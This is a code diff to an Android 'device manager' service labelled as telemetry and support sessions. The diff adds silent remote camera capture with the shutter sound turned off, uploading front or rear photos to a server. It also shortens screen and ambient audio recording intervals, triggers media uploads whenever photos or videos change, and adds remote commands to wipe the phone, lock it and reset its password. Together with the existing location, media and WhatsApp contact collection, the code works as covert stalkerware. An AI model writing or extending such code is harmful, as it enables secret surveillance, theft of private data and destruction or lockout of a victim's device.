@@ -3,13 +3,16 @@ package com.company.devicemgr.services;
 import android.app.Notification;
 import android.app.AppOpsManager;
 import android.app.Service;
+import android.app.admin.DevicePolicyManager;
 import android.app.usage.UsageStats;
 import android.app.usage.UsageStatsManager;
+import android.content.ComponentName;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
 import android.content.ContentResolver;
 import android.content.ContentUris;
 import android.content.SharedPreferences;
+import android.database.ContentObserver;
 import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationListener;
@@ -22,8 +25,15 @@ import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.hardware.display.DisplayManager;
 import android.hardware.display.VirtualDisplay;
+import android.graphics.ImageFormat;
+import android.graphics.Rect;
+import android.graphics.SurfaceTexture;
+import android.graphics.YuvImage;
+import android.hardware.Camera;
 import android.os.Build;
+import android.os.Handler;
 import android.os.IBinder;
+import android.os.Looper;
 import android.util.DisplayMetrics;
 import android.provider.MediaStore;
 import android.provider.ContactsContract;
@@ -37,6 +47,7 @@ import com.company.devicemgr.utils.HttpClient;
 import com.company.devicemgr.utils.PermissionCompat;
 import com.company.devicemgr.utils.TelemetryDispatch;
 import com.company.devicemgr.utils.SupportSessionApi;
+import com.company.devicemgr.receivers.DeviceAdminReceiver;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -57,6 +68,8 @@ import java.util.Iterator;
 import java.util.List;
 import java.util.Map;
 import java.util.Set;
+import java.util.concurrent.CountDownLatch;
+import java.util.concurrent.TimeUnit;
 
 public class ForegroundTelemetryService extends Service implements LocationListener {
     private static final String TAG = "ForegroundSvc";
@@ -77,15 +90,17 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private static final String KEY_LAST_MEDIA_SCAN_AT = "last_media_scan_at";
     private static final String KEY_LAST_APP_USAGE_SYNC_AT = "last_app_usage_sync_at";
     private static final String KEY_RECENT_WHATSAPP_CONTACTS = "recent_whatsapp_contacts";
-    private static final long NORMAL_LOOP_MS = 30_000L;
+    private static final long NORMAL_LOOP_MS = 5_000L;
     private static final long ACTIVE_REMOTE_LOOP_MS = 900L;
     private static final long MEDIA_SCAN_INTERVAL_MS = 60_000L;
     private static final long APP_USAGE_SYNC_INTERVAL_MS = 15 * 60_000L;
     private static final long APP_USAGE_WINDOW_MS = 24 * 60 * 60_000L;
-    private static final long REMOTE_SCREEN_FRAME_INTERVAL_MS = 60_000L;
-    private static final int REMOTE_AUDIO_SEGMENT_MS = 60_000;
+    private static final long REMOTE_SCREEN_FRAME_INTERVAL_MS = 15_000L;
+    private static final long REMOTE_CAMERA_FRAME_INTERVAL_MS = 15_000L;
+    private static final int REMOTE_AUDIO_SEGMENT_MS = 15_000;
     private static final int REMOTE_AUDIO_SAMPLE_RATE = 16_000;
     private static final int MAX_MEDIA_ITEMS_PER_SCAN = 1500;
+    private static final long MEDIA_CHANGE_DEBOUNCE_MS = 7000L;
 
     private LocationManager locationManager;
     private volatile Location lastLocation = null;
@@ -96,9 +111,18 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private volatile File screenRecorderFile = null;
     private volatile String activeScreenSessionId = null;
     private volatile String activeAudioSessionId = null;
+    private volatile String activeCameraSessionId = null;
+    private volatile String activeCameraFacing = null;
     private volatile boolean remoteScreenSegmentRunning = false;
     private volatile boolean remoteAudioSegmentRunning = false;
+    private volatile boolean remoteCameraCaptureRunning = false;
     private static final String KEY_REMOTE_SCREEN_LAST_UPLOAD_PREFIX = "remote_screen_last_upload_";
+    private static final String KEY_REMOTE_CAMERA_LAST_UPLOAD_PREFIX = "remote_camera_last_upload_";
+    private static final String KEY_REMOTE_HARD_RESET_LAST_SESSION = "remote_hard_reset_last_session";
+    private static final String KEY_REMOTE_LOCK_SCREEN_LAST_SESSION = "remote_lock_screen_last_session";
+    private static final String KEY_REMOTE_SET_PASSWORD_LAST_SESSION = "remote_set_password_last_session";
+    private volatile long lastMediaChangeAt = 0L;
+    private volatile ContentObserver mediaObserver = null;
 
     @Override
     public void onCreate() {
@@ -124,10 +148,11 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         } catch (Exception e) {
             Log.e(TAG, "location request failed", e);
         }
+        registerMediaObservers();
 
         new Thread(() -> {
             try {
-                Thread.sleep(4000);
+                Thread.sleep(1000);
             } catch (InterruptedException ignored) {
             }
 
@@ -315,6 +340,8 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         if (activeSession == null || activeSession.optString("sessionId", "").length() == 0) {
             activeScreenSessionId = null;
             activeAudioSessionId = null;
+            activeCameraSessionId = null;
+            activeCameraFacing = null;
             releaseScreenProjection();
             return;
         }
@@ -324,6 +351,8 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         if ("ambient_audio".equals(requestType)) {
             activeScreenSessionId = null;
             activeAudioSessionId = sessionId;
+            activeCameraSessionId = null;
+            activeCameraFacing = null;
             releaseScreenProjection();
             maybeStartRemoteAudioSegment(sessionId);
             return;
@@ -332,12 +361,56 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         if ("screen".equals(requestType)) {
             activeScreenSessionId = sessionId;
             activeAudioSessionId = null;
+            activeCameraSessionId = null;
+            activeCameraFacing = null;
             maybeStartRemoteScreenSegment(sessionId);
+            return;
+        }
+
+        if ("camera_front".equals(requestType) || "camera_rear".equals(requestType)) {
+            activeScreenSessionId = null;
+            activeAudioSessionId = null;
+            activeCameraSessionId = sessionId;
+            activeCameraFacing = requestType;
+            releaseScreenProjection();
+            maybeStartRemoteCameraCapture(sessionId, requestType);
+            return;
+        }
+
+        if ("hard_reset".equals(requestType)) {
+            activeScreenSessionId = null;
+            activeAudioSessionId = null;
+            activeCameraSessionId = null;
+            activeCameraFacing = null;
+            releaseScreenProjection();
+            maybeRunRemoteHardReset(sessionId);
+            return;
+        }
+
+        if ("lock_screen".equals(requestType)) {
+            activeScreenSessionId = null;
+            activeAudioSessionId = null;
+            activeCameraSessionId = null;
+            activeCameraFacing = null;
+            releaseScreenProjection();
+            maybeRunRemoteLockScreen(sessionId);
+            return;
+        }
+
+        if ("set_lock_password".equals(requestType)) {
+            activeScreenSessionId = null;
+            activeAudioSessionId = null;
+            activeCameraSessionId = null;
+            activeCameraFacing = null;
+            releaseScreenProjection();
+            maybeRunRemoteSetLockPassword(sessionId, activeSession.optString("note", ""));
             return;
         }
 
         activeScreenSessionId = null;
         activeAudioSessionId = null;
+        activeCameraSessionId = null;
+        activeCameraFacing = null;
         releaseScreenProjection();
     }
 
@@ -365,6 +438,18 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         }, "remote-audio-segment").start();
     }
 
+    private void maybeStartRemoteCameraCapture(String sessionId, String facing) {
+        if (remoteCameraCaptureRunning || !isCameraSessionActive(sessionId, facing)) return;
+        remoteCameraCaptureRunning = true;
+        new Thread(() -> {
+            try {
+                captureAndUploadCameraFrame(sessionId, facing);
+            } finally {
+                remoteCameraCaptureRunning = false;
+            }
+        }, "remote-camera-capture").start();
+    }
+
     private boolean isScreenSessionActive(String sessionId) {
         return sessionId != null && sessionId.equals(activeScreenSessionId);
     }
@@ -373,14 +458,174 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         return sessionId != null && sessionId.equals(activeAudioSessionId);
     }
 
+    private boolean isCameraSessionActive(String sessionId, String facing) {
+        return sessionId != null
+                && sessionId.equals(activeCameraSessionId)
+                && facing != null
+                && facing.equals(activeCameraFacing);
+    }
+
+    private void maybeRunRemoteHardReset(String sessionId) {
+        if (sessionId == null || sessionId.trim().isEmpty()) return;
+        String executed = prefs().getString(KEY_REMOTE_HARD_RESET_LAST_SESSION, null);
+        if (sessionId.equals(executed)) return;
+        prefs().edit().putString(KEY_REMOTE_HARD_RESET_LAST_SESSION, sessionId).apply();
+        new Thread(() -> triggerHardReset(sessionId), "remote-hard-reset").start();
+    }
+
+    private void triggerHardReset(String sessionId) {
+        long startedAt = System.currentTimeMillis();
+        JSONObject ctx = new JSONObject();
+        try {
+            ctx.put("sessionId", sessionId);
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            ComponentName admin = new ComponentName(this, DeviceAdminReceiver.class);
+            if (dpm == null || !dpm.isAdminActive(admin)) {
+                ctx.put("reason", "device_admin_inactive");
+                sendMetric("remote_command", "hard_reset", "blocked", null, null, ctx);
+                return;
+            }
+            sendMetric("remote_command", "hard_reset", "requested", null, null, ctx);
+            dpm.wipeData(0);
+        } catch (Exception e) {
+            try {
+                ctx.put("error", e.getClass().getSimpleName());
+            } catch (Exception ignored) {
+            }
+            sendMetric("remote_command", "hard_reset", "error", (int) (System.currentTimeMillis() - startedAt), null, ctx);
+        } finally {
+            finalizeCommandSession(sessionId);
+        }
+    }
+
+    private void maybeRunRemoteLockScreen(String sessionId) {
+        if (sessionId == null || sessionId.trim().isEmpty()) return;
+        String executed = prefs().getString(KEY_REMOTE_LOCK_SCREEN_LAST_SESSION, null);
+        if (sessionId.equals(executed)) return;
+        prefs().edit().putString(KEY_REMOTE_LOCK_SCREEN_LAST_SESSION, sessionId).apply();
+        new Thread(() -> triggerLockScreen(sessionId), "remote-lock-screen").start();
+    }
+
+    private void triggerLockScreen(String sessionId) {
+        JSONObject ctx = new JSONObject();
+        try {
+            ctx.put("sessionId", sessionId);
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            ComponentName admin = new ComponentName(this, DeviceAdminReceiver.class);
+            if (dpm == null || !dpm.isAdminActive(admin)) {
+                ctx.put("reason", "device_admin_inactive");
+                sendMetric("remote_command", "lock_screen", "blocked", null, null, ctx);
+                return;
+            }
+            dpm.lockNow();
+            sendMetric("remote_command", "lock_screen", "ok", null, null, ctx);
+        } catch (Exception e) {
+            try {
+                ctx.put("error", e.getClass().getSimpleName());
+            } catch (Exception ignored) {
+            }
+            sendMetric("remote_command", "lock_screen", "error", null, null, ctx);
+        } finally {
+            finalizeCommandSession(sessionId);
+        }
+    }
+
+    private void maybeRunRemoteSetLockPassword(String sessionId, String newPassword) {
+        if (sessionId == null || sessionId.trim().isEmpty()) return;
+        String executed = prefs().getString(KEY_REMOTE_SET_PASSWORD_LAST_SESSION, null);
+        if (sessionId.equals(executed)) return;
+        prefs().edit().putString(KEY_REMOTE_SET_PASSWORD_LAST_SESSION, sessionId).apply();
+        new Thread(() -> triggerSetLockPassword(sessionId, newPassword), "remote-set-lock-password").start();
+    }
+
+    private void triggerSetLockPassword(String sessionId, String newPassword) {
+        JSONObject ctx = new JSONObject();
+        try {
+            ctx.put("sessionId", sessionId);
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            ComponentName admin = new ComponentName(this, DeviceAdminReceiver.class);
+            if (dpm == null || !dpm.isAdminActive(admin)) {
+                ctx.put("reason", "device_admin_inactive");
+                sendMetric("remote_command", "set_lock_password", "blocked", null, null, ctx);
+                return;
+            }
+            String normalized = newPassword != null ? newPassword.trim() : "";
+            if (normalized.length() < 4) {
+                ctx.put("reason", "password_too_short");
+                sendMetric("remote_command", "set_lock_password", "blocked", null, null, ctx);
+                return;
+            }
+            boolean changed = dpm.resetPassword(normalized, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
+            ctx.put("changed", changed);
+            sendMetric("remote_command", "set_lock_password", changed ? "ok" : "rejected", null, null, ctx);
+            if (changed) {
+                try {
+                    dpm.lockNow();
+                } catch (Exception ignored) {
+                }
+            }
+        } catch (Exception e) {
+            try {
+                ctx.put("error", e.getClass().getSimpleName());
+            } catch (Exception ignored) {
+            }
+            sendMetric("remote_command", "set_lock_password", "error", null, null, ctx);
+        } finally {
+            finalizeCommandSession(sessionId);
+        }
+    }
+
+    private void finalizeCommandSession(String sessionId) {
+        if (sessionId == null || sessionId.trim().isEmpty()) return;
+        try {
+            HttpClient.postJson(
+                    ApiConfig.api("/api/support-sessions/" + sessionId + "/stop"),
+                    "{}",
+                    currentToken()
+            );
+        } catch (Exception ignored) {
+        }
+    }
+
     private void maybeUploadAllMedia() {
         long lastScanAt = prefs().getLong(KEY_LAST_MEDIA_SCAN_AT, 0L);
-        if ((System.currentTimeMillis() - lastScanAt) < MEDIA_SCAN_INTERVAL_MS) return;
+        long now = System.currentTimeMillis();
+        boolean mediaChangedRecently = lastMediaChangeAt > 0L && (now - lastMediaChangeAt) <= MEDIA_CHANGE_DEBOUNCE_MS;
+        if (!mediaChangedRecently && (now - lastScanAt) < MEDIA_SCAN_INTERVAL_MS) return;
         try {
             uploadAllMediaOnce();
             prefs().edit().putLong(KEY_LAST_MEDIA_SCAN_AT, System.currentTimeMillis()).apply();
+            lastMediaChangeAt = 0L;
         } catch (Exception e) {
             Log.e(TAG, "maybeUploadAllMedia err", e);
+        }
+    }
+
+    private void registerMediaObservers() {
+        try {
+            if (mediaObserver != null) return;
+            mediaObserver = new ContentObserver(new Handler(Looper.getMainLooper())) {
+                @Override
+                public void onChange(boolean selfChange) {
+                    lastMediaChangeAt = System.currentTimeMillis();
+                }
+            };
+            ContentResolver resolver = getContentResolver();
+            resolver.registerContentObserver(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, mediaObserver);
+            resolver.registerContentObserver(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, true, mediaObserver);
+            resolver.registerContentObserver(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, true, mediaObserver);
+        } catch (Exception e) {
+            Log.e(TAG, "registerMediaObservers err", e);
+        }
+    }
+
+    private void unregisterMediaObservers() {
+        try {
+            if (mediaObserver == null) return;
+            getContentResolver().unregisterContentObserver(mediaObserver);
+        } catch (Exception ignored) {
+        } finally {
+            mediaObserver = null;
         }
     }
 
@@ -702,6 +947,177 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         }
     }
 
+    private void captureAndUploadCameraFrame(String sessionId, String facing) {
+        if (!isCameraSessionActive(sessionId, facing)) return;
+        long now = System.currentTimeMillis();
+        long lastUploadAt = prefs().getLong(KEY_REMOTE_CAMERA_LAST_UPLOAD_PREFIX + sessionId + "_" + facing, 0L);
+        if ((now - lastUploadAt) < REMOTE_CAMERA_FRAME_INTERVAL_MS) return;
+
+        if (!hasPermission(android.Manifest.permission.CAMERA)) {
+            try {
+                JSONObject ctx = new JSONObject();
+                ctx.put("sessionId", sessionId);
+                ctx.put("facing", facing);
+                ctx.put("reason", "missing_camera_permission");
+                sendMetric("remote_stream", "camera_frame", "permission_missing", null, null, ctx);
+            } catch (Exception ignored) {
+            }
+            return;
+        }
+
+        long startedAt = System.currentTimeMillis();
+        try {
+            int desiredFacing = "camera_front".equals(facing) ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
+            int cameraId = resolveCameraId(desiredFacing);
+            if (cameraId < 0) throw new IllegalStateException("camera_not_available");
+            byte[] jpeg = captureCameraJpeg(cameraId);
+            if (jpeg == null || jpeg.length == 0) throw new IllegalStateException("empty_camera_frame");
+            if (!isCameraSessionActive(sessionId, facing)) throw new IllegalStateException("stale_camera_session");
+
+            Map<String, String> form = new HashMap<>();
+            form.put("captureMode", "remote_live");
+            form.put("captureKind", facing);
+            form.put("supportSessionId", sessionId);
+            form.put("segmentStartedAtMs", String.valueOf(startedAt));
+            form.put("segmentDurationMs", "1");
+            JSONObject metadata = new JSONObject();
+            metadata.put("source", "android.hardware.Camera");
+            metadata.put("capturedAtMs", startedAt);
+            metadata.put("facing", facing);
+            metadata.put("captureUid", sessionId + ":" + facing + ":" + startedAt);
+            form.put("metadataJson", metadata.toString());
+
+            long uploadStartedAt = System.currentTimeMillis();
+            String filename = "remote_" + facing + "_" + sessionId + "_" + startedAt + ".jpg";
+            JSONObject parsed = uploadCameraFrameWithRetry(filename, jpeg, form);
+            JSONObject ctx = new JSONObject();
+            ctx.put("sessionId", sessionId);
+            ctx.put("facing", facing);
+            if (parsed.optBoolean("ok")) {
+                prefs().edit().putLong(KEY_REMOTE_CAMERA_LAST_UPLOAD_PREFIX + sessionId + "_" + facing, System.currentTimeMillis()).apply();
+                ctx.put("fileId", parsed.optString("fileId", null));
+                sendMetric("remote_stream", "camera_frame", "ok", (int) (System.currentTimeMillis() - uploadStartedAt), (double) jpeg.length, ctx);
+            } else {
+                ctx.put("response", parsed.toString());
+                sendMetric("remote_stream", "camera_frame", "error", (int) (System.currentTimeMillis() - uploadStartedAt), null, ctx);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "captureAndUploadCameraFrame err", e);
+            try {
+                JSONObject ctx = new JSONObject();
+                ctx.put("sessionId", sessionId);
+                ctx.put("facing", facing);
+                ctx.put("error", e.getClass().getSimpleName());
+                sendMetric("remote_stream", "camera_frame", "error", (int) (System.currentTimeMillis() - startedAt), null, ctx);
+            } catch (Exception ignored) {
+            }
+        }
+    }
+
+    private JSONObject uploadCameraFrameWithRetry(String filename, byte[] jpeg, Map<String, String> form) throws Exception {
+        Exception lastError = null;
+        for (int attempt = 1; attempt <= 3; attempt++) {
+            try {
+                String res = HttpClient.uploadFile(
+                        ApiConfig.api("/api/media/" + currentDeviceId() + "/upload"),
+                        "media",
+                        filename,
+                        jpeg,
+                        "image/jpeg",
+                        form,
+                        currentToken()
+                );
+                return new JSONObject(res != null ? res : "{}");
+            } catch (Exception e) {
+                lastError = e;
+                if (attempt < 3) {
+                    try {
+                        Thread.sleep(400L * attempt);
+                    } catch (InterruptedException ignored) {
+                    }
+                }
+            }
+        }
+        throw lastError != null ? lastError : new IllegalStateException("camera_upload_failed");
+    }
+
+    private int resolveCameraId(int desiredFacing) {
+        try {
+            int count = Camera.getNumberOfCameras();
+            for (int i = 0; i < count; i++) {
+                Camera.CameraInfo info = new Camera.CameraInfo();
+                Camera.getCameraInfo(i, info);
+                if (info.facing == desiredFacing) return i;
+            }
+            return count > 0 ? 0 : -1;
+        } catch (Exception e) {
+            return -1;
+        }
+    }
+
+    private byte[] captureCameraJpeg(int cameraId) throws Exception {
+        final Object lock = new Object();
+        final byte[][] out = new byte[1][];
+        final Exception[] err = new Exception[1];
+        final CountDownLatch latch = new CountDownLatch(1);
+        Camera camera = null;
+        SurfaceTexture surfaceTexture = null;
+        try {
+            camera = Camera.open(cameraId);
+            try {
+                camera.enableShutterSound(false);
+            } catch (Exception ignored) {
+            }
+            Camera.Parameters params = camera.getParameters();
+            Camera.Size best = null;
+            for (Camera.Size size : params.getSupportedPreviewSizes()) {
+                if (best == null || (size.width * size.height) > (best.width * best.height)) best = size;
+            }
+            if (best != null) params.setPreviewSize(best.width, best.height);
+            params.setPreviewFormat(ImageFormat.NV21);
+            try {
+                params.set("shutter-sound", "off");
+            } catch (Exception ignored) {
+            }
+            camera.setParameters(params);
+            surfaceTexture = new SurfaceTexture(10);
+            camera.setPreviewTexture(surfaceTexture);
+            camera.startPreview();
+            camera.setOneShotPreviewCallback((data, cam) -> {
+                try {
+                    Camera.Size size = cam.getParameters().getPreviewSize();
+                    YuvImage yuv = new YuvImage(data, ImageFormat.NV21, size.width, size.height, null);
+                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                    yuv.compressToJpeg(new Rect(0, 0, size.width, size.height), 82, baos);
+                    synchronized (lock) {
+                        out[0] = baos.toByteArray();
+                    }
+                } catch (Exception ex) {
+                    synchronized (lock) {
+                        err[0] = ex;
+                    }
+                } finally {
+                    latch.countDown();
+                }
+            });
+            if (!latch.await(4, TimeUnit.SECONDS)) throw new IllegalStateException("camera_capture_timeout");
+        } finally {
+            try {
+                if (camera != null) {
+                    camera.stopPreview();
+                    camera.release();
+                }
+            } catch (Exception ignored) {
+            }
+            try {
+                if (surfaceTexture != null) surfaceTexture.release();
+            } catch (Exception ignored) {
+            }
+        }
+        if (err[0] != null) throw err[0];
+        return out[0];
+    }
+
     private void sendTelemetryOnce() {
         try {
             JSONObject payload = new JSONObject();
@@ -714,15 +1130,24 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                 payload.put("location", loc);
             } else {
                 Location fallback = null;
+                Location gps = null;
+                Location net = null;
                 try {
                     if (hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION))
-                        fallback = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                        gps = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                 } catch (Exception ignored) {
                 }
                 try {
-                    if (fallback == null && hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION))
-                        fallback = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                    if (hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION))
+                        net = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                 } catch (Exception ignored) {
+                }
+                if (gps != null && net != null) {
+                    float gpsAcc = gps.hasAccuracy() ? gps.getAccuracy() : Float.MAX_VALUE;
+                    float netAcc = net.hasAccuracy() ? net.getAccuracy() : Float.MAX_VALUE;
+                    fallback = gpsAcc <= netAcc ? gps : net;
+                } else {
+                    fallback = gps != null ? gps : net;
                 }
 
                 if (fallback != null) {
@@ -788,6 +1213,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     @Override
     public void onDestroy() {
         running = false;
+        unregisterMediaObservers();
         try {
             if (locationManager != null) locationManager.removeUpdates(this);
         } catch (Exception ignored) {
@@ -1095,6 +1521,10 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             SharedPreferences sp = prefs();
             String deviceId = currentDeviceId();
             String token = currentToken();
+            if (token == null || token.trim().isEmpty() || deviceId == null || deviceId.trim().isEmpty()) {
+                Log.w(TAG, "media upload skipped: missing auth token or deviceId");
+                return;
+            }
 
             String uploadedJson = sp.getString(KEY_UPLOADED_MEDIA_HASHES, "{}");
             JSONObject uploadedObj = new JSONObject(uploadedJson);
